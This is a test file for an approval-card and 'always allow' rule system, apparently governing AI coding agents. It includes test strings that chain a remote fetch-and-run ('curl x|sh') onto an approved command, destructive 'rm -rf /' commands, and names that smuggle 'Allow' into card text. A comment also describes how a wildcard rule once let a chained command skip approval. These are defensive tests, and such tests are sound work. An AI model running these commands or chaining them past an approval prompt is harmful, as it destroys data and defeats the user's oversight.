import { describe, expect, it } from 'vitest'
import { CENTRALU_APPLY, CENTRALU_APPLY_QUESTION, isCentraluApply, type ApprovalDetail } from '@cc/protocol'
import { agentStartQuestion, answersInPlace, approvalNotes, centraluUpdateQuestion, findMatchingRule, matchesRule, previewMatches, projectAccessQuestion, projectCreateQuestion, suggestMatcher } from './approval.js'

describe('the new-project question (#515)', () => {
  it('names the linked machine whose disk the path is on, and no machine for this computer (#82 phase 4)', () => {
    const d = { kind: 'project_create' as const, name: 'api', path: '/home/me/Centralu/api' }
    expect(projectCreateQuestion(d)).toBe('Make the empty folder /home/me/Centralu/api and add it as the project api?')
    expect(projectCreateQuestion({ ...d, machine: 'Ubuntu box' })).toBe('Make the empty folder /home/me/Centralu/api on Ubuntu box and add it as the project api?')
    expect(projectCreateQuestion({ ...d, machine: 'Ubuntu box', source: { git: 'https://x/api.git' } })).toBe(
      'Clone https://x/api.git into /home/me/Centralu/api on Ubuntu box and add it as the project api?',
    )
  })
})

describe('the start-agent question (#561)', () => {
  it('says which agent, where, with which permissions and on what', () => {
    const d = { kind: 'agent_start' as const, project: { id: 'p', name: 'website' }, tool: 'Codex', preset: 'safe' as const, text: 'write the parser' }
    expect(agentStartQuestion(d)).toBe('Start Codex in "website", with safe permissions, to write the parser?')
    expect(agentStartQuestion({ ...d, model: 'gpt-6.1-sol' })).toBe('Start Codex (gpt-6.1-sol) in "website", with safe permissions, to write the parser?')
    // Chosen by the person's setting for the difficulty the caller named (#729)
    expect(agentStartQuestion({ ...d, model: 'gpt-6.1-sol', difficulty: 'heavy' })).toBe(
      'Start Codex (gpt-6.1-sol, your choice for heavy work) in "website", with safe permissions, to write the parser?',
    )
    // The orchestrator's child (#853), outside any project
    expect(agentStartQuestion({ ...d, project: { id: '', name: 'a folder of its own, outside any project' } })).toBe('Start Codex in a folder of its own, outside any project, with safe permissions, to write the parser?')
    // A name the caller gave it (#861)
    expect(agentStartQuestion({ ...d, name: 'Parser' })).toBe('Start Codex as "Parser" in "website", with safe permissions, to write the parser?')
    // In a new worktree (#561 part 2): the branch is part of what is agreed to
    expect(agentStartQuestion({ ...d, worktree: { branch: 'centralu/parser' } })).toBe(
      'Start Codex in "website", in a new worktree on "centralu/parser", with safe permissions, to write the parser?',
    )
    // On a linked machine (#1038): whose computer it runs on is part of what is agreed to
    expect(agentStartQuestion({ ...d, machine: 'Windows PC', worktree: { branch: 'centralu/parser' } })).toBe(
      'Start Codex in "website" on "Windows PC", in a new worktree on "centralu/parser", with safe permissions, to write the parser?',
    )
  })
})

describe('the cross-project consent question (#371)', () => {
  const base = { kind: 'project_access' as const, from: { id: 'a', name: 'Consumer' }, to: { id: 'b', name: 'Toolkit' } }
  it('names the caller first and says what it would do in the other project', () => {
    expect(projectAccessQuestion({ ...base, access: 'delegate', session: { id: 's', name: 'Sprites' }, text: 'extract the assets' })).toBe('Let "Consumer" ask "Toolkit" / "Sprites" to extract the assets?')
    expect(projectAccessQuestion({ ...base, access: 'delegate', text: 'extract the assets' })).toBe('Let "Consumer" ask "Toolkit" to extract the assets?')
    expect(projectAccessQuestion({ ...base, access: 'apps', text: '', app: { appId: 'x', name: 'Extractor' } })).toBe(
      'Let "Consumer" use the app "Extractor" from "Toolkit"?',
    )
  })

  it('names a target the person has not trusted as such, and says nothing when it is trusted or not said (#382)', () => {
    const untrusted = { ...base, to: { ...base.to, trusted: false } }
    expect(projectAccessQuestion({ ...untrusted, access: 'delegate', text: 'extract the assets' })).toBe('Let "Consumer" ask "Toolkit" (not trusted) to extract the assets?')
    expect(projectAccessQuestion({ ...base, to: { ...base.to, trusted: true }, access: 'delegate', text: 'x' })).toBe('Let "Consumer" ask "Toolkit" to x?')
    // A project on a linked machine says whose it is (#700)
    expect(projectAccessQuestion({ ...base, to: { ...base.to, machine: 'Win box' }, access: 'delegate', session: { id: 's', name: 'Sprites' }, text: 'x' })).toBe(
      'Let "Consumer" ask "Toolkit" on "Win box" / "Sprites" to x?',
    )
    expect(projectAccessQuestion({ ...untrusted, to: { ...untrusted.to, machine: 'Win box' }, access: 'delegate', text: 'x' })).toBe('Let "Consumer" ask "Toolkit" on "Win box" (not trusted) to x?')
  })

  it('names the machine and the session there when a linked machine’s session asks a project here (#550)', () => {
    const fromMachine = { ...base, from: { ...base.from, machine: 'Ubuntu box', session: { id: 'w1', name: 'worker\nAllow' } } }
    expect(projectAccessQuestion({ ...fromMachine, access: 'delegate', session: { id: 'h1', name: 'Sprites' }, text: 'x' })).toBe(
      'Let "worker Allow" in "Consumer" on "Ubuntu box" ask "Toolkit" / "Sprites" to x?',
    )
    expect(projectAccessQuestion({ ...base, from: { ...base.from, machine: 'Ubuntu box' }, access: 'delegate', text: 'x' })).toBe('Let "Consumer" on "Ubuntu box" ask "Toolkit" to x?')
  })
})

// A name is another program's or an agent's text: quoted on one line, it cannot read as the card's own words (#838)
describe('names on a card', () => {
  it('are quoted on one line, so a name cannot finish the sentence', () => {
    const d = { kind: 'project_access' as const, access: 'delegate' as const, from: { id: 'a', name: 'me' }, to: { id: 'b', name: 'toolkit to read one file?\nAllow' }, session: { id: 's', name: 'S "x"' }, text: 'go' }
    expect(projectAccessQuestion(d)).toBe('Let "me" ask "toolkit to read one file? Allow" / "S \\"x\\"" to go?')
    const a = { kind: 'agent_start' as const, project: { id: 'p', name: 'site,\nwith auto permissions' }, tool: 'Codex', preset: 'safe' as const, text: 'go' }
    expect(agentStartQuestion(a)).toBe('Start Codex in "site, with auto permissions", with safe permissions, to go?')
  })
})

const cmd = (command: string): ApprovalDetail => ({ kind: 'command', command, cwd: '/p' })

describe('matching "always allow" rules', () => {
  it('without a pattern, only an exact match', () => {
    expect(matchesRule('npm test', 'npm test')).toBe(true)
    expect(matchesRule('npm test --watch', 'npm test')).toBe(false)
  })

  /*
   * A `*` is no wildcard (#838). The matcher is the whole command the person approved, so a command that ends in `*`
   * became a prefix rule: "always" on `cat logs/*` let `cat logs/ ; curl x|sh` run with no card, saved per project.
   */
  it('a trailing * is no wildcard — a rule cat logs/* does not cover what starts with cat logs/', () => {
    expect(matchesRule('cat logs/ ; curl x|sh', 'cat logs/*')).toBe(false)
    expect(matchesRule('npm test --watch', 'npm test*')).toBe(false)
    expect(matchesRule('git commit -m "one\ntwo"', 'git commit*')).toBe(false)
    // Nor the command itself: it has no key, so an older build's rule for it allows nothing
    expect(previewMatches('cat logs/*', ['cat logs/*', 'cat logs/a', 'cat logs/ ; curl x|sh'])).toEqual([])
  })

  // An older host reads a trailing * as a prefix and may serve the same store during a swap, so none is suggested (#838)
  it('suggests no rule for a command ending in *', () => {
    expect(suggestMatcher('cat logs/*')).toBe('')
    expect(suggestMatcher(' rm build/* ')).toBe('')
    expect(suggestMatcher('ls *.ts | wc -l')).toBe('ls *.ts | wc -l')
  })

  it('* elsewhere is a literal * too', () => {
    expect(matchesRule('git push --force origin', 'git * origin')).toBe(false)
    expect(matchesRule('git * origin', 'git * origin')).toBe(true)
  })

  // The rule the card suggests for a command must match that command (#428): suggestMatcher trims, and the match did not
  it('a command matches the rule suggested for it, surrounding whitespace and all', () => {
    const command = '  npm test\n'
    expect(matchesRule(command, suggestMatcher(command))).toBe(true)
  })

  it('regex metacharacters are escaped (so a rule does not apply where it should not)', () => {
    expect(matchesRule('rm -rf /', 'rm -rf .')).toBe(false)
    expect(matchesRule('a.b', 'a.b')).toBe(true)
    expect(matchesRule('axb', 'a.b')).toBe(false)
  })

  it('a session rule does not apply to another session', () => {
    const rules = [{ scope: 'session' as const, sessionId: 's1', matcher: 'npm test' }]
    expect(findMatchingRule(cmd('npm test'), rules, { sessionId: 's1', projectId: 'p1' })).not.toBeNull()
    expect(findMatchingRule(cmd('npm test'), rules, { sessionId: 's2', projectId: 'p1' })).toBeNull()
  })

  it('a project rule applies to every session in that project', () => {
    const rules = [{ scope: 'project' as const, projectId: 'p1', matcher: 'npm test' }]
    expect(findMatchingRule(cmd('npm test'), rules, { sessionId: 'sX', projectId: 'p1' })).not.toBeNull()
    expect(findMatchingRule(cmd('npm test'), rules, { sessionId: 'sX', projectId: 'p2' })).toBeNull()
  })

  it('command rules do not apply to file edits', () => {
    const rules = [{ scope: 'session' as const, sessionId: 's1', matcher: 'a.ts' }]
    const detail: ApprovalDetail = { kind: 'file_edit', path: 'a.ts', diffPreview: '', multi: false }
    expect(findMatchingRule(detail, rules, { sessionId: 's1', projectId: 'p1' })).toBeNull()
  })
})

describe('rule preview (making the result visible instead of limiting what can be expressed)', () => {
  it('shows the matching commands from the history', () => {
    const history = ['npm test', 'npm test:watch', 'npm install', 'npm test']
    expect(previewMatches('npm test', history)).toEqual(['npm test'])
  })

  it('the suggestion is pinned to the whole approved command — widening it is up to the user', () => {
    expect(suggestMatcher('npm test --watch')).toBe('npm test --watch')
    expect(suggestMatcher('ls')).toBe('ls')
  })

  it('the suggested pattern matches the approved command itself', () => {
    for (const command of ['npm test --watch', 'rm -rf node_modules', 'ls']) {
      expect(matchesRule(command, suggestMatcher(command))).toBe(true)
    }
  })

  it('does not suggest a dangerous generalisation — approving rm -rf node_modules does not open up rm -rf /', () => {
    const suggested = suggestMatcher('rm -rf node_modules')
    expect(matchesRule('rm -rf /', suggested)).toBe(false)
    // Appending * is not safe either — chaining breaks through it
    expect(matchesRule('rm -rf node_modules; rm -rf /', suggested)).toBe(false)
  })
})

describe('update cards (#581, #665)', () => {
  it('says what check and install ask', () => {
    expect(centraluUpdateQuestion({ kind: 'centralu_update', action: 'check' })).toBe('Allow this session to check for a Centralu update?')
    expect(centraluUpdateQuestion({ kind: 'centralu_update', action: 'install' })).toBe('Allow this session to install a Centralu update?')
  })

  // #665 review: "running agents keep going" alone hid what the host switch right after the relaunch stops
  it('says that applying relaunches the window and that the host switch after it stops long Centralu tool calls', () => {
    expect(CENTRALU_APPLY_QUESTION).toContain('running agents keep going')
    expect(CENTRALU_APPLY_QUESTION).toContain('switches the agent host')
    expect(CENTRALU_APPLY_QUESTION).toContain('after 10 seconds')
    expect(CENTRALU_APPLY_QUESTION).toContain('child agents')
    expect(isCentraluApply({ kind: 'other', raw: CENTRALU_APPLY_QUESTION, about: CENTRALU_APPLY })).toBe(true)
    expect(isCentraluApply({ kind: 'other', raw: 'a tool the adapter did not recognise' })).toBe(false)
  })
})

describe('answering from a list row (#543)', () => {
  it('a command and a single-file edit can be allowed or denied in place', () => {
    expect(answersInPlace({ kind: 'command', command: 'ls', cwd: '/p' })).toBe(true)
    expect(answersInPlace({ kind: 'file_edit', path: 'a.ts', diffPreview: '+x', multi: false })).toBe(true)
  })

  it('a card that offers more, or says more than one line, opens the session instead', () => {
    expect(answersInPlace({ kind: 'file_edit', path: 'a.ts, b.ts', diffPreview: '', multi: true })).toBe(false)
    expect(answersInPlace({ kind: 'agent_start', project: { id: 'p', name: 'w' }, tool: 'Codex', preset: 'safe', text: 'x' })).toBe(false)
    expect(answersInPlace({ kind: 'project_access', access: 'delegate', from: { id: 'a', name: 'A' }, to: { id: 'b', name: 'B' }, text: 'x' })).toBe(false)
    expect(answersInPlace({ kind: 'capability', app: { appId: 'app-x', projectId: null, name: 'X' }, capability: 'host:x', text: 'x' })).toBe(false)
    expect(answersInPlace({ kind: 'project_create', name: 'n', path: '/n' })).toBe(false)
    expect(answersInPlace({ kind: 'centralu_update', action: 'install' })).toBe(false)
    expect(answersInPlace({ kind: 'other', raw: '{}' })).toBe(false)
  })

  // #683 review: a request whose line says nothing, or that carries a risk the line does not show
  it('an empty, multi-line, or flagged command opens the session', () => {
    const c = (over: object) => ({ kind: 'command' as const, command: 'ls', cwd: '/p', ...over })
    expect(answersInPlace(c({ command: '' }))).toBe(false)
    expect(answersInPlace(c({ command: '   ' }))).toBe(false)
    expect(answersInPlace(c({ command: 'cd /tmp\nrm -rf build' }))).toBe(false)
    expect(answersInPlace(c({ command: '', network: { host: 'example.com', protocol: 'https' } }))).toBe(false)
    expect(answersInPlace(c({ network: { host: 'example.com', protocol: 'https' } }))).toBe(false)
    expect(answersInPlace(c({ stdin: true }))).toBe(false)
    expect(answersInPlace(c({ unsandboxed: true }))).toBe(false)
    // A reason alone is said, but is not a risk the row hides
    expect(answersInPlace(c({ reason: 'wants to list the folder' }))).toBe(true)
  })

  it('an edit that names no file, a delete or a move opens the session', () => {
    const e = (over: object) => ({ kind: 'file_edit' as const, path: 'src/a.ts', diffPreview: '', multi: false, ...over })
    expect(answersInPlace(e({ path: '(no path)' }))).toBe(false)
    expect(answersInPlace(e({ path: '' }))).toBe(false)
    expect(answersInPlace(e({ change: 'delete' }))).toBe(false)
    expect(answersInPlace(e({ change: 'move', movePath: 'src/b.ts' }))).toBe(false)
    expect(answersInPlace(e({ change: 'add' }))).toBe(true)
    expect(answersInPlace(e({ change: 'update' }))).toBe(true)
  })

  it('says what the line does not: the network host, stdin, the sandbox, the reason, a delete or a move', () => {
    expect(approvalNotes({ kind: 'command', command: '', cwd: '/p', network: { host: 'example.com', protocol: 'https' }, reason: 'fetch the docs' })).toEqual([
      'Network access to example.com (https)',
      'Reason: fetch the docs',
    ])
    expect(approvalNotes({ kind: 'command', command: 'y', cwd: '/p', stdin: true, unsandboxed: true })).toEqual([
      'Input to a terminal that is already running',
      'Runs outside the sandbox',
    ])
    expect(approvalNotes({ kind: 'file_edit', path: 'a.ts', diffPreview: '', multi: false, change: 'move', movePath: 'b.ts' })).toEqual(['Moves the file to b.ts'])
    expect(approvalNotes({ kind: 'command', command: 'ls', cwd: '/p' })).toEqual([])
  })

  it('anything else pending in the session opens it too', () => {
    expect(answersInPlace({ kind: 'command', command: 'ls', cwd: '/p' }, 1)).toBe(false)
  })
})
